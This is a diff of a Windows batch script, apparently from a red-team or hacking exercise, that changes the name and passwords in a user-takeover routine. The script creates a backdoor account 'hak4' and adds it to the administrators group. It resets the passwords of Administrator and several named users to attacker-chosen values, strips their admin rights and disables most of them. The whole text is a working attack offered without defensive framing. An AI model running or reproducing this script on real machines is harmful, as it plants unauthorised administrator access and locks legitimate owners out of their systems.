@@ -40,21 +40,21 @@ pause
 
 :: Change Passwords of All Users
 
-net user /Add group4 G4HackersGotIt 
+net user /Add hak4 hak4u@llday 
 
-net localgroup administrators group4 /Add 
+net localgroup administrators hak4 /Add 
 
 net user group4 /Active:yes 
 
  
 
-net user Administrator Group4hackers! 
+net user Administrator hak4ever!
 
-net user Administrator /Active:no 
+:: net user Administrator /Active:no 
 
  
 
-net user Me Group4hackers! 
+net user Me hak4ever!
 
 net localgroup administrators Me /delete 
 
@@ -62,7 +62,7 @@ net user Me /Active:no
 
  
 
-net user ellenripley Group4hackers! 
+net user ellenripley hak4ever! 
 
 net localgroup administrators ellenripley /delete 
 
@@ -70,7 +70,7 @@ net user ellenripley /Active:no
 
  
 
-net user vader Group4hackers! 
+net user vader hak4ever!
 
 net localgroup administrators vader /delete 
 
